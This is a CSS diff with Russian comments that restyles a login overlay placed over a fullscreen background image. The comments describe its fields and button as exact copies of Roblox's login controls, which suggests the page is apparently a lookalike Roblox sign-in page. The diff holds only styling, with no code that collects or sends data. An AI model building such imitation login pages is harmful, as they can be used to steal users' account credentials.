@@ -7,15 +7,10 @@
 
 body {
     background-color: #000;
-    color: #fff;
-    height: 100vh;
     overflow: hidden;
-    display: flex;
-    flex-direction: column;
-    position: relative;
 }
 
-/* Твой фон */
+/* Картинка на весь экран */
 .fullscreen-bg {
     position: absolute;
     top: 0;
@@ -26,126 +21,55 @@ body {
     z-index: 1;
 }
 
-/* Модалка (рисуется поверх картинки, чтобы перекрыть нарисованный текст) */
-.login-container {
+/* Контейнер для трех элементов */
+.login-overlay {
     position: absolute;
-    top: 50%;
+    top: 45%; /* Настройка по высоте (можешь менять) */
     left: 50%;
     transform: translate(-50%, -50%);
-    background-color: #232527; /* Плотный фон, перекрывает картинку */
-    border-radius: 8px;
-    padding: 32px 36px 36px 36px;
-    width: 440px;
-    box-shadow: 0 4px 24px rgba(0, 0, 0, 0.8);
-    z-index: 10;
-    text-align: center;
-}
-
-.login-container h1 {
-    font-size: 28px;
-    font-weight: 700;
-    margin-bottom: 24px;
-    color: #fff;
-}
-
-#loginForm {
+    width: 400px; /* Ширина инпутов */
     display: flex;
     flex-direction: column;
-    gap: 12px;
-    margin-bottom: 16px;
+    gap: 12px; /* Расстояние между полями */
+    z-index: 10;
 }
 
-#loginForm input {
+/* Точная копия полей ввода из Roblox */
+.login-overlay input {
     width: 100%;
     background-color: #2f3133;
     border: 1px solid #393b3d;
     border-radius: 4px;
     padding: 0 16px;
-    height: 44px;
+    height: 48px; /* Высота поля */
     color: #fff;
     font-size: 15px;
     outline: none;
+    transition: border-color 0.1s;
 }
 
-/* Когда нажимаешь на поле, рамка становится светлее */
-#loginForm input:focus {
-    border-color: #666;
-}
-
-#loginForm input::placeholder {
+/* Текст исчезает при клике */
+.login-overlay input::placeholder {
     color: #b8b8b8;
 }
 
-/* Кнопка входа */
+.login-overlay input:focus {
+    border-color: #666;
+}
+
+/* Точная копия кнопки "Авторизоваться" */
 .login-btn {
-    background-color: #232527;
+    background-color: #232527; /* Темный, прозрачный фон */
     color: #fff;
-    border: 1px solid #555;
+    border: 1px solid #555; /* Серая обводка */
     border-radius: 4px;
-    height: 44px;
+    height: 48px;
     font-size: 16px;
     font-weight: 500;
     cursor: pointer;
-    margin-top: 8px;
+    margin-top: 4px; /* Отступ от поля пароля */
 }
 
 .login-btn:hover {
     background-color: #32353a;
-}
-
-.forgot-password {
-    margin-bottom: 20px;
-}
-
-.forgot-password a {
-    color: #fff;
-    text-decoration: none;
-    font-size: 14px;
-}
-
-.forgot-password a:hover {
-    text-decoration: underline;
-}
-
-.divider {
-    height: 1px;
-    background-color: #393b3d;
-    margin: 0 -36px 20px -36px;
-}
-
-.login-options {
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-    margin-bottom: 24px;
-}
-
-.secondary-btn {
-    background-color: #2f3133;
-    border: none;
-    color: #fff;
-    height: 44px;
-    border-radius: 4px;
-    font-weight: 500;
-    font-size: 14px;
-    cursor: pointer;
-}
-
-.secondary-btn:hover {
-    background-color: #393b3d;
-}
-
-.footer-text {
-    font-size: 14px;
-    color: #b8b8b8;
-}
-
-.footer-text a {
-    color: #fff;
-    text-decoration: none;
-    font-weight: 600;
-}
-
-.footer-text a:hover {
-    text-decoration: underline;
 }
